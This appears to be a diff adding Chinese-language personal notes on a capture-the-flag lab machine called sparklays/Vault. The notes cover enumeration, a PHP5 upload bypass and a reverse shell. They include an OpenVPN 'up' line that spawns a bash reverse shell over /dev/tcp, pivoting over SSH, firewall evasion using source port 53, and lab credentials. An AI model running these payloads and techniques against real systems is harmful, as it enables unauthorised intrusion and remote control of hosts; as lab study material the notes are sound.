@@ -1,0 +1,72 @@
+nmap -sV -sC -Pn  10.129.186.248 > nmap.txt
+nmap -p- -T5  10.129.186.248 > nmapall.txt
+nmap -Pn -p- -T5  10.129.186.248 > nmapall.txt
+
+
+
+1.查看80端口是html,所以gobuster掃描html,php,txt
+2.盲猜/sparklays/發現403,根據該路徑在掃一次gobuster
+3.不許允上傳type的檔案,嘗試magic byte
+
+gobuster dir  -u http://sparklays.com/sparklays/ -w /usr/share/dirb/wordlists/common.txt  -x txt,php,html -t50 > gobuster.txt
+gobuster dir  -u http://sparklays.com/sparklays/design/ -w /usr/share/dirb/wordlists/common.txt  -x txt,php,html -t50 > gobusterdesign.txt
+
+
+Dav3therav3123
+
+root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+alex:x:1000:1000:alex,,,:/home/alex:/bin/bash
+dave:x:1001:1001:,,,:/home/dave:/bin/bash
+
+
+Dav3therav3123
+
+dav3gerous567
+
+
+
+
+remote 192.168.122.1
+ifconfig 10.200.0.2 10.200.0.1
+
+
+
+1.nmap找到80端口,gobuster找到/sparklays/design可上傳php5檔案
+2.訪問/sparklays/design/uploads/reverse.php5取得revershell
+3.在dave/desktop下找到帳密可ssh登入
+4.查看Servers發現有192.168.122.4-5兩個地址
+5.上傳elf格式的nmap檔案後掃描這兩ip
+./nmap 192.168.122.4-5
+6.找到192.168.122.4有80及22port
+7.使用ssh將victim上的vm機器的80端口bind到kali
+使用~C進入ssh>
+-L 8081:192.168.122.4:80
+8.訪問到vpn頁面輸入以下回彈shell到192.168.122.1
+nobind
+dev tun
+script-security 2
+up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/4445 0<&1 2>&1&'"
+9.取得192.168.122.4之後在dave下看到user.txt
+10.在192.168.122.4下查到密碼dav3gerous567
+11.在192.168.122.4的/etc/hosts下查到192.168.5.2 是vault
+12.在192.168.122.4下ip route看到去到192.168.5.2的路由須經過192.168.122.5
+13.在192.168.122.4下nmap掃描192.168.5.2發現2個端口是closed,判斷可能有防火牆限制
+nmap -Pn 192.168.5.2
+14.在192.168.122.4下使用nmap指定使用dns53 port來源掃描一次,發現987/tcp open  unknown
+nmap -Pn 192.168.5.2 -source-port 53
+15.使用nc指定從53port去查看192.168.5.2的987端口,發現987端口是ssh服務
+nc -p 53 -nv 192.168.5.2 987
+16.通過使用ipv6協議ping多播地址可以查找到有三個ipv6鄰居地址
+ping6  -I ens3 ff02::1
+fe80::5054:ff:fec6:7066 dev ens3 lladdr 52:54:00:c6:70:66 REACHABLE
+fe80::5054:ff:fe3a:3bd5 dev ens3 lladdr 52:54:00:3a:3b:d5 REACHABLE
+fe80::5054:ff:fee1:7441 dev ens3 lladdr 52:54:00:e1:74:41 REACHABLE
+fe80::5054:ff:fe17:ab49/64
+17.使用arp -an查看到以下地址
+? (192.168.122.1) at fe:54:00:17:ab:49 [ether] on ens3
+? (192.168.122.5) at 52:54:00:3a:3b:d5 [ether] on ens3
+18.使用nmap對ipv6地址做掃描
+nmap -6 fe80::5054:ff:fec6:7066%ens3
+nmap -6 fe80::5054:ff:fe3a:3bd5%ens3
+nmap -6 fe80::5054:ff:fee1:7441%ens3
